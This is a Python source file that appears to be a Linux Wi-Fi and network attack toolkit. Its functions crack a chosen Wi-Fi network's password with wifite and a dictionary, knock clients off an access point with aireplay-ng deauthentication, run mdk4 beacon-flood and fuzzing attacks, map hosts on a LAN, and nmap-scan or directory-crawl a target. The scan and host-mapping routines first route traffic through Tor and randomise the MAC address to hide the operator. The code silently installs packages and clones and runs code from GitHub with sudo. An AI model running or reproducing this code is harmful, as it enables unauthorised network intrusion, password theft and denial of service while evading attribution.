import os, re, platform, subprocess
from time import sleep
from json import load
from glob import glob
def system_info():
    subprocess.run('sudo apt install -y lshw'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    try: searching_a_little_information_about_os = subprocess.run('lshw -short'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    except FileNotFoundError: searching_a_little_information_about_os = 'None'
    try: 
        operation_memory, video_controller = re.search(r'memory\s+(\w+)', searching_a_little_information_about_os.stdout.decode()), re.search(r'display\s+\w+\s.(\S+.+).', searching_a_little_information_about_os.stdout.decode())
        if video_controller: video_controller = video_controller.group(1)
        else: video_controller = 'None'
        if operation_memory: operation_memory = operation_memory.group(1)[0] + ' ' + operation_memory.group(1)[1:]
        else: operation_memory = 'None'
    except AttributeError: video_controller, operation_memory = 'None', 'None'
    searching_processor_information, searching_information_about_network_adapters, searching_ip_address_route_and_computer_ip_address, searching_mac_address = subprocess.run('lscpu', stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), subprocess.run('ip a'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), subprocess.run('ip route'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), subprocess.run('ifconfig', stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    all_information_about_computer, how_much, processor, processor_mhz, interface, ip_address_route_and_ip_address_computer, ipv6_address_computer, mac_address = [], -1, re.search(r'Model name[:]\s+(\S+.+)', searching_processor_information.stdout.decode()), re.search(r'CPU max MHz[]:]\s+(\d+)', searching_processor_information.stdout.decode()), re.findall(r'\d*[:]\s(\w+)[:]', searching_information_about_network_adapters.stdout.decode()), re.findall(r'(\d+[.]\d+[.]\d+[.]\d+)', searching_ip_address_route_and_computer_ip_address.stdout.decode()), re.search(r'inet6\s(\w+[:][:]\w+[:]\w+[:]\w+[:]\w+)', searching_mac_address.stdout.decode()), re.findall(r'(\w+[:]\w+[:]\w+[:]\w+[:]\w+[:]\w+)', searching_mac_address.stdout.decode())
    if 'lo' in interface: del interface[interface.index('lo')]
    try: ip_address_route, ip_address_computer = ip_address_route_and_ip_address_computer[0], ip_address_route_and_ip_address_computer[1]
    except IndexError: ip_address_route, ip_address_computer = 'None', 'None'
    if ipv6_address_computer: ipv6_address_computer = ipv6_address_computer.group(1)
    else: ipv6_address_computer = 'None'
    if processor: processor = processor.group(1) 
    else: processor = 'None'
    if processor_mhz: processor_mhz = processor_mhz.group(1) + ' MHz'
    else: processor_mhz = 'None'
    all_information_about_computer.append({'architecture': platform.architecture()[0], 'os': platform.freedesktop_os_release()['NAME'], 'operation_memory': operation_memory, 'processor': f'Kernels: {os.cpu_count()} {processor} {processor_mhz}', 'video_controller': video_controller, 'ip_address_route': ip_address_route, 'ip_address_computer': ip_address_computer, 'ipv6_address_computer': ipv6_address_computer})
    for _ in interface:
        how_much += 1
        try: all_information_about_computer.append({'interface': interface[how_much], 'mac_address': mac_address[how_much]})
        except IndexError: break
    return all_information_about_computer
def search_wifi(): 
    searching_wifi = subprocess.run('sudo iwlist scan'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    frequency, ssid, mac_address, channel, mode, encryption_yes_or_no, encryption, cipher, authentication, ieee, signal = re.findall(r'Frequency[:](\w+.+GHz)', searching_wifi.stdout.decode()), re.findall(r'ESSID[:]["](\S+)["]', searching_wifi.stdout.decode()), re.findall(r'Address:\s(\S+)', searching_wifi.stdout.decode()), re.findall(r'Channel[:](\d+)', searching_wifi.stdout.decode()), re.findall(r'Mode[:](\w+)', searching_wifi.stdout.decode()), re.findall(r'Encryption\skey[:](\w+)', searching_wifi.stdout.decode()), re.findall(r'IEEE\s\S+\w+/(\w+)', searching_wifi.stdout.decode()), re.findall(r'Group\sCipher\s[:]\s(\w+)', searching_wifi.stdout.decode()), re.findall(r'Authentication\sSuites\s[(]1[)]\s[:]\s(\w+)', searching_wifi.stdout.decode()), re.findall(r'IEEE\s(\S+\w+)/', searching_wifi.stdout.decode()), re.findall(r'Signal level=(-\d+\sdBm)', searching_wifi.stdout.decode())
    if all([frequency, ssid, mac_address, channel, mode, encryption_yes_or_no, encryption, cipher, authentication, ieee, signal]) == False: raise SystemError
    return list(zip(frequency, ssid, mac_address, channel, mode, encryption_yes_or_no, encryption, cipher, authentication, ieee, signal))
def search_all_ip_addresses_connected_with_network():
    subprocess.run('sudo apt install -y tor'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo systemctl start tor'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('git clone https://github.com/ruped24/toriptables2'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    geting_ip_address = subprocess.run('sudo toriptables2/toriptables2.py -l'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    try: re.search(r'(\d+[.]\d+[.]\d+[.]\d+)', geting_ip_address.stdout.decode()).group(1)
    except AttributeError: SystemError
    geting_interface, searching_all_ip_addresses = subprocess.run('ip link'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), subprocess.run('sudo arp-scan -l'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    try: interface = re.search(r'\d+[:]\s(\w+)[:]+.+state\sUP', geting_interface.stdout.decode()).group(1)
    except AttributeError: raise ConnectionError
    subprocess.run('sudo toriptables2/toriptables2.py -f'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo rm -r toriptables2'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} down'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} up'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} down'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} up'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), 
    ip_address_computer, mac_address_computer, other_ip_addresses, other_mac_addresses, devices = re.search(r'IPv4[:]\s(\S+)', searching_all_ip_addresses.stdout.decode()).group(1), re.search(r'MAC[:]\s(\S+),', searching_all_ip_addresses.stdout.decode()).group(1), re.findall(r'(\d+[.]\d+[.]\d+[.]\d+)', searching_all_ip_addresses.stdout.decode())[1:], re.findall(r'(\w+[:]\w+[:]\w+[:]\w+[:]\w+[:]\w+)', searching_all_ip_addresses.stdout.decode())[1:], re.findall(r'\w+[:]\w+[:]\w+[:]\w+[:]\w+[:]\w+\s(\S+.+)', searching_all_ip_addresses.stdout.decode())
    all_information_about_searched_all_ip_addresses_connected_with_network, all_information_about_searched_all_ip_addresses_connected_with_network_for_variable = list(zip(other_ip_addresses[1:], other_mac_addresses[1:], devices[1:])), [[{'ip_address_route': other_ip_addresses[0], 'mac_address_route': other_mac_addresses[0], 'device_route': devices[0], 'ip_address_computer': ip_address_computer, 'mac_address_computer': mac_address_computer}]]
    for information_about_ip_address in all_information_about_searched_all_ip_addresses_connected_with_network: all_information_about_searched_all_ip_addresses_connected_with_network_for_variable.append({'ip_address': information_about_ip_address[0], 'mac_address': information_about_ip_address[1], 'device': information_about_ip_address[2]})
    return all_information_about_searched_all_ip_addresses_connected_with_network_for_variable
def hack_wifi(wifi_name, file_dictionary_passwords = 'None'):
    searching_network_adapter_for_hack_wifi, searching_wifi_for_hack_wifi = subprocess.run('ip a'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), subprocess.run('sudo iwlist scan'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interfaces, ssid, mac_address = re.findall(r'\d*[:]\s(\w+)[:]', searching_network_adapter_for_hack_wifi.stdout.decode()), re.findall(r'ESSID[:]["](\S+)["]', searching_wifi_for_hack_wifi.stdout.decode()), re.findall(r'Address:\s(\S+)', searching_wifi_for_hack_wifi.stdout.decode())
    all_wifi = list(zip(ssid, mac_address))
    for wifi in all_wifi:
        if wifi_name in wifi:
            subprocess.run('sudo airmon-ng check kill'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
            for interface in interfaces:
                starting_adapter_mode_monitor = subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
                if 'on' in starting_adapter_mode_monitor.stdout.decode().split():
                    def _stoping_monitor_mode(): subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL) 
                    def _continue_hacking_wifi():
                        path_cracked_wifi_file_format_json = glob('*')
                        if 'cracked.json' in path_cracked_wifi_file_format_json:
                            with open(file = 'cracked.json', mode = 'r') as file_with_information_about_cracked_wifi: all_information_about_cracked_wifi_with_file_json = load(file_with_information_about_cracked_wifi)
                            try: all_information_about_cracked_wifi = {'type_hacked_wifi': all_information_about_cracked_wifi_with_file_json[0]['type'], 'ssid': all_information_about_cracked_wifi_with_file_json[0]['essid'], 'bssid': all_information_about_cracked_wifi_with_file_json[0]['bssid'], 'channel': all_information_about_cracked_wifi_with_file_json[0]['channel'], 'wps_pin': all_information_about_cracked_wifi_with_file_json[0]['pin'], 'password': all_information_about_cracked_wifi_with_file_json[0]['psk']}
                            except KeyError: all_information_about_cracked_wifi = {'type_hacked_wifi': all_information_about_cracked_wifi_with_file_json[0]['type'], 'ssid': all_information_about_cracked_wifi_with_file_json[0]['essid'], 'bssid': all_information_about_cracked_wifi_with_file_json[0]['bssid'], 'password': all_information_about_cracked_wifi_with_file_json[0]['key']}
                            subprocess.run('sudo rm -r hs'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), os.remove('cracked.json')
                            return all_information_about_cracked_wifi
                        else:
                            _stoping_monitor_mode()
                            raise SystemExit
                    interface_in_monitor_mode = re.search(r'[]](\w+)', starting_adapter_mode_monitor.stdout.decode().split()[starting_adapter_mode_monitor.stdout.decode().split().index('on') + 1]).group(1)
                    if file_dictionary_passwords == 'None': 
                        if subprocess.run(f'sudo wifite -i {interface_in_monitor_mode} -mac -b {wifi[wifi.index(wifi_name) + 1]}'.split()).returncode == 0: 
                            _stoping_monitor_mode()
                            return _continue_hacking_wifi()
                        else: raise TimeoutError
                    elif '/home/' in file_dictionary_passwords and '.txt' in file_dictionary_passwords and os.path.exists(file_dictionary_passwords): 
                        if subprocess.run(f'sudo wifite -i {interface_in_monitor_mode} -mac -b {wifi[wifi.index(wifi_name) + 1]} --dict {file_dictionary_passwords}'.split()).returncode == 0: 
                            _stoping_monitor_mode()
                            return _continue_hacking_wifi()
                        else: 
                            _stoping_monitor_mode() 
                            raise TimeoutError
                    else:
                        _stoping_monitor_mode()
                        raise FileNotFoundError
            else: 
                subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
                raise SystemError
    else: raise ValueError
def dos_attack_wifi(wifi_name, how_much_time_long_attack):
    if how_much_time_long_attack == 0: raise ZeroDivisionError
    searching_network_adapter_for_dos_attack, searching_wifi_for_dos_attack = subprocess.run('ip a'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), subprocess.run('sudo iwlist scan'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interfaces, ssid, mac_address, channel = re.findall(r'\d*[:]\s(\w+)[:]', searching_network_adapter_for_dos_attack.stdout.decode()), re.findall(r'ESSID[:]["](\S+)["]', searching_wifi_for_dos_attack.stdout.decode()), re.findall(r'Address:\s(\S+)', searching_wifi_for_dos_attack.stdout.decode()), re.findall(r'Channel[:](\d+)', searching_wifi_for_dos_attack.stdout.decode())
    all_wifi = list(zip(ssid, mac_address, channel))
    for wifi in all_wifi:
        if wifi_name in wifi:
            subprocess.run('sudo airmon-ng check kill'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
            for interface in interfaces:
                starting_adapter_mode_monitor = subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
                if 'on' in starting_adapter_mode_monitor.stdout.decode().split():
                    interface_in_monitor_mode = re.search(r'[]](\w+)', starting_adapter_mode_monitor.stdout.decode().split()[starting_adapter_mode_monitor.stdout.decode().split().index('on') + 1]).group(1)
                    subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
                    if subprocess.Popen(f'sudo airodump-ng --bssid {wifi[wifi.index(wifi_name) + 1]} --channel {wifi[wifi.index(wifi_name) + 2]} {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL) and subprocess.run(f'sudo aireplay-ng --deauth {abs(how_much_time_long_attack) * 2} -a {wifi[wifi.index(wifi_name) + 1]} {interface_in_monitor_mode}'.split()).returncode == 0: subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
                    else: 
                        if sleep(3) and subprocess.Popen(f'sudo airodump-ng --bssid {wifi[wifi.index(wifi_name) + 1]} --channel {wifi[wifi.index(wifi_name) + 2]} {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL) and subprocess.run(f'sudo aireplay-ng --deauth {abs(how_much_time_long_attack) * 2} -a {wifi[wifi.index(wifi_name) + 1]} {interface_in_monitor_mode}'.split()).returncode == 0: subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
                        else: 
                            subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
                            raise TimeoutError
                    return
            else: 
                subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
                raise SystemError
    else: raise ValueError
def beacon_flood_attack_wifi(how_much_time_long_attack): 
    if how_much_time_long_attack == 0: raise ZeroDivisionError
    searching_network_adapter_for_beacon_flood_attack_wifi = subprocess.run('ip a'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interfaces = re.findall(r'\d*[:]\s(\w+)[:]', searching_network_adapter_for_beacon_flood_attack_wifi.stdout.decode())
    subprocess.run('sudo apt install -y mdk4'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo airmon-ng check kill'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    for interface in interfaces:
        starting_adapter_mode_monitor = subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
        if 'on' in starting_adapter_mode_monitor.stdout.decode().split():
            interface_in_monitor_mode = re.search(r'[]](\w+)', starting_adapter_mode_monitor.stdout.decode().split()[starting_adapter_mode_monitor.stdout.decode().split().index('on') + 1]).group(1)
            subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.Popen(f'sudo mdk4 {interface_in_monitor_mode} b -b g -h -ams 500'.split()), sleep(abs(how_much_time_long_attack)), subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
            return
    else: 
        subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
        raise SystemError
def fuzzer_attack_wifi(how_much_time_long_attack): 
    if how_much_time_long_attack == 0: raise ValueError
    searching_network_adapter_for_fuzzer_attack_wifi = subprocess.run('ip a'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interfaces = re.findall(r'\d*[:]\s(\w+)[:]', searching_network_adapter_for_fuzzer_attack_wifi.stdout.decode())
    subprocess.run('sudo apt install -y mdk4'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo airmon-ng check kill'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    for interface in interfaces:
        starting_adapter_mode_monitor = subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
        if 'on' in starting_adapter_mode_monitor.stdout.decode().split():
            interface_in_monitor_mode = re.search(r'[]](\w+)', starting_adapter_mode_monitor.stdout.decode().split()[starting_adapter_mode_monitor.stdout.decode().split().index('on') + 1]).group(1)
            subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo airmon-ng start {interface}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.Popen(f'sudo mdk4 {interface_in_monitor_mode} f -s abp -m bmstm -p 4000'.split()), sleep(abs(how_much_time_long_attack)), subprocess.run(f'sudo airmon-ng stop {interface_in_monitor_mode}'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
            return
    else: 
        subprocess.run('systemctl start NetworkManager'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
        raise SystemError
def change_ip_address(): 
    geting_current_ip_address_computer = subprocess.run('ip route'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    try: current_ip_address_computer = re.findall(r'(\d+[.]\d+[.]\d+[.]\d+)', geting_current_ip_address_computer.stdout.decode())[1]
    except IndexError: raise ConnectionError
    if os.path.exists('/usr/local/bin/toriptables2.py'): geting_new_ip_address_computer = subprocess.run('sudo toriptables2.py -r'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    else:
        subprocess.run('sudo apt install -y tor'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo systemctl start tor'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('git clone https://github.com/ruped24/toriptables2'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo mv toriptables2/toriptables2.py /usr/local/bin'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo rm -r toriptables2'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
        geting_new_ip_address_computer = subprocess.run('sudo toriptables2.py -l'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    try: geting_new_ip_address_computer = re.search(r'(\d+[.]\d+[.]\d+[.]\d+)', geting_new_ip_address_computer.stdout.decode()).group(1)
    except AttributeError: raise SystemError
    all_information_about_ip_addresses = {'current_ip_address': current_ip_address_computer, 'new_ip_address': geting_new_ip_address_computer}
    return all_information_about_ip_addresses
def change_mac_address():
    geting_interface = subprocess.run('ip link'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interface = re.search(r'\d+[:]\s(\w+)[:]+.+state\sUP', geting_interface.stdout.decode())
    if interface: interface = interface.group(1)
    else: raise ConnectionError
    subprocess.run(f'sudo ifconfig {interface} down'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    mac_address_information = subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    subprocess.run(f'sudo ifconfig {interface} up'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    current_mac_address, new_mac_address = re.search(r'Current\sMAC[:]\s+(\S+)', mac_address_information.stdout.decode()).group(1), re.search(r'New\sMAC:\s+(\S+)', mac_address_information.stdout.decode()).group(1)
    all_information_about_changed_mac_addresses = {'current_mac_address': current_mac_address, 'new_mac_address': new_mac_address}
    return all_information_about_changed_mac_addresses
def scanner(target_ip_address_or_url_website): 
    geting_interface = subprocess.run('ip link'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interface = re.search(r'\d+[:]\s(\w+)[:]+.+state\sUP', geting_interface.stdout.decode())
    if interface: interface = interface.group(1)
    else: raise ConnectionError
    subprocess.run('sudo apt install -y tor'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo systemctl start tor'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('git clone https://github.com/ruped24/toriptables2'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} down'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} up'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    geting_ip_address = subprocess.run('sudo toriptables2/toriptables2.py -l'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    try: re.search(r'(\d+[.]\d+[.]\d+[.]\d+)', geting_ip_address.stdout.decode()).group(1)
    except AttributeError: raise SystemError
    scanning_target = subprocess.run(f'sudo nmap -A {target_ip_address_or_url_website}'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    subprocess.run('sudo toriptables2/toriptables2.py -f'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo rm -r toriptables2'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} down'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo macchanger {interface} -r'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run(f'sudo ifconfig {interface} up'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    ports, status_ports, services, closed_ports, os, target_ip_address = re.findall(r'(\d+)/tcp', scanning_target.stdout.decode()), re.findall(r'\d+/tcp\s+(\w+)', scanning_target.stdout.decode()), re.findall(r'\d+/tcp\s+\w+\s+(\S+)', scanning_target.stdout.decode()), re.search(r'Not\sshown[:]\s(\w+\s\w+)', scanning_target.stdout.decode()), re.search(r'OS\sdetails[:]\s(\w+.+)', scanning_target.stdout.decode()), re.search(r'(\d+[.]\d+[.]\d+[.]\d+)', scanning_target.stdout.decode())
    _information_about_ports, information_about_ports = list(zip(ports, status_ports, services)), []
    for information_about_port in _information_about_ports: information_about_ports.append({'port': information_about_port[0], 'status_port': information_about_port[1], 'service': information_about_port[2]})
    if closed_ports: closed_ports = closed_ports.group(1)
    else: closed_ports = 'None' 
    if os: os = os.group(1)
    else: os = 'None'
    if target_ip_address: target_ip_address = target_ip_address.group(1)
    else: target_ip_address = 'None'
    if ports == [] and status_ports == [] and services == [] and closed_ports == 'None' and os == 'None' and target_ip_address == 'None': os, target_ip_address, closed_ports, information_about_ports, information_about_ports_for_variable_or_format_json = f'NOT FOUND INFORMATION ABOUT TARGET: {target_ip_address_or_url_website}' * 4, [f'NOT FOUND INFORMATION ABOUT TARGET: {target_ip_address_or_url_website}']
    information_about_ports.append([{'os': os, 'ip_address': target_ip_address, 'closed_ports': closed_ports}])
    return information_about_ports
def search_web_directories_of_this_website(url_website): 
    subprocess.run('sudo apt install -y python3-pip'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL), subprocess.run('sudo pip3 install dirhunt'.split(), stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
    geting_interface = subprocess.run('ip link'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
    interface = re.search(r'\d+[:]\s(\w+)[:]+.+state\sUP', geting_interface.stdout.decode())
    if interface: interface = interface.group(1)
    else: raise ConnectionError
    starting_find_web_directories_of_website, all_found_url_of_website = subprocess.run(f'dirhunt {url_website}'.split(), stdout = subprocess.PIPE, stderr = subprocess.DEVNULL), []
    for found_one_url_of_website in starting_find_web_directories_of_website.stdout.decode().split():
        one_url_of_website = re.search(r'(\w+://+.+)', found_one_url_of_website)
        if one_url_of_website: all_found_url_of_website.append(one_url_of_website.group(1))
    if all_found_url_of_website == []: all_found_url_of_website.append('NOT FOUND INFORMATION')
    return all_found_url_of_website
